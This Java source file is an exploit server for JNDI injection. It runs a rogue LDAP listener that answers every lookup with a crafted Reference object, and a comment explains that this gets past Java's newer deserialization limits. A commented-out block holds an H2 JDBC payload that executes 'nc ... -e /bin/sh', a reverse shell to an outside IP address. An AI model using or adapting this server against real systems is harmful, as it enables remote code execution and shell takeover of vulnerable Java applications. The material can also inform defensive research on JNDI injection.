package LDAP;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.RefAddr;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;

/**
 * 通过返回 Reference 对象，绕过高版本对序列化数据的限制。
 */
public class LdapRefServer {

    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main (String[] args) {

        String url = "http://vps:8000/#ExportObject";
        int port = 1389;


        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;


        /**
         * */ public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */ @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }


        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            System.out.println("Send LDAP reference");
            e.addAttribute("objectClass", "javaNamingReference");

//            String url = "jdbc:h2:mem:memdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
//                    "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'\\;" +
//                    "CALL EXEC ('nc 111.229.158.40 2345 -e /bin/sh')\\;";

            Reference ref = new Reference("test", "com.caucho.hessian.client.HessianProxyFactory", null);
//            ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
            ref.add(new StringRefAddr("url", "http://127.0.0.1:8076/hessian"));
//            ref.add(new StringRefAddr("initialSize", "1"));
            ref.add(new StringRefAddr("type", "javax.naming.directory.DirContext"));

            encodeReference('#', ref, e);

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

        private Entry encodeReference(char separator, Reference ref, Entry attrs) {

            String s;

            if ((s = ref.getClassName()) != null) {
                attrs.addAttribute("javaClassName", s);
            }

            if ((s = ref.getFactoryClassName()) != null) {
                attrs.addAttribute("javaFactory", s);
            }

            if ((s = ref.getFactoryClassLocation()) != null) {
                attrs.addAttribute("javaCodeBase", s);
            }

            int count = ref.size();

            if (count > 0) {
                String refAttr = "";
                RefAddr refAddr;

                for (int i = 0; i < count; i++) {
                    refAddr = ref.get(i);

                    if (refAddr instanceof StringRefAddr) {
                        refAttr = ("" + separator + i +
                                separator + refAddr.getType() +
                                separator + refAddr.getContent());
                    }
                    attrs.addAttribute("javaReferenceAddress", refAttr);
                }

            }

            return attrs;
        }

    }

}